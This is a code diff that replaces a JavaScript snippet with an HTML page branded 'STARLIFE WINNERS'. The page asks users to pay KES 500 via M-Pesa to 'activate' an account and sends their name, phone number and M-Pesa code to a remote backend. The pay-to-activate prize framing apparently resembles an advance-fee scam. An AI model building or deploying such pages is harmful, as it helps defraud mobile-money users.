@@ -1,10 +1,50 @@
-// SEND TO ADMIN PANEL
-fetch('https://starlife-mpesa-backend.vercel.app/api/submit',{
-  method:'POST',
-  headers:{'Content-Type':'application/json'},
-  body: JSON.stringify({
-    name: document.querySelector('input[name="name"]')?.value || 'Customer',
-    phone: document.querySelector('input[name="phone"]')?.value || document.getElementById('phone')?.value || 'No Phone',
-    code: document.querySelector('input[name="code"]')?.value || document.getElementById('mpesaCode')?.value || document.getElementById('code')?.value
-  })
-}).then(()=>alert('Code sent to admin for verification!'));
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>STARLIFE WINNERS</title>
+<style>
+body{background:#0a0a0a;color:white;font-family:Arial;margin:0}
+.h{padding:12px;background:#111;display:flex;justify-content:space-between}
+.logo{color:#ffcc00;font-weight:bold;font-size:20px}
+.main{padding:16px;max-width:500px;margin:auto}
+.c{background:#151515;border:1px solid #333;border-radius:10px;padding:16px}
+.payBox{background:#1a1a0a;border:1px solid #444;border-radius:8px;padding:12px;text-align:center;margin:10px 0}
+.mpesaBox{background:#0f1f0f;border-radius:8px;padding:12px;border:1px dashed #00a651}
+input{width:100%;padding:12px;margin:8px 0;border-radius:6px;border:1px solid #333;background:#222;color:white;box-sizing:border-box}
+button{width:100%;padding:14px;border:none;border-radius:6px;font-weight:bold;font-size:16px;cursor:pointer}
+.btn-pay{background:#00a651;color:white}
+#msg{text-align:center;font-weight:bold;margin-top:10px}
+</style></head><body>
+<div class="h"><div class="logo">★ STARLIFE WINNERS</div></div>
+<div class="main">
+<div class="c">
+<h3 style="text-align:center;color:#ffcc00">ACTIVATE ACCOUNT</h3>
+<div class="payBox">
+<b>LIPA NA M-PESA</b><br>Paybill: 123456<br>Account: STARLIFE<br>Amount: <b style="color:#00ff88">KES 500</b>
+</div>
+<div class="mpesaBox">
+<input type="text" id="name" placeholder="Your Full Name">
+<input type="tel" id="phone" placeholder="M-Pesa Phone 07...">
+<input type="text" id="mpesaCode" placeholder="M-Pesa Code e.g QGH7...">
+<button class="btn-pay" onclick="submitCode()">SUBMIT CODE & ACTIVATE</button>
+<p id="msg"></p>
+<p style="font-size:11px;color:#aaa;text-align:center">Admin will verify in 2 minutes</p>
+</div>
+</div>
+</div>
+<script>
+async function submitCode(){
+ const name=document.getElementById('name').value.trim();
+ const phone=document.getElementById('phone').value.trim();
+ const code=document.getElementById('mpesaCode').value.trim();
+ const msg=document.getElementById('msg');
+ if(!name||!phone||!code){msg.style.color='red';msg.innerText='Jaza zote';return;}
+ msg.style.color='#ffcc00';msg.innerText='Sending to admin...';
+ try{
+  const res=await fetch('https://starlife-mpesa-backend.vercel.app/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name,phone,code})});
+  const data=await res.json();
+  if(data.success){msg.style.color='#00ff88';msg.innerText='✅ Code sent! Admin will approve';}
+  else{msg.style.color='red';msg.innerText='Failed';}
+ }catch(e){msg.style.color='red';msg.innerText='Network error';}
+}
+</script>
+</body></html>
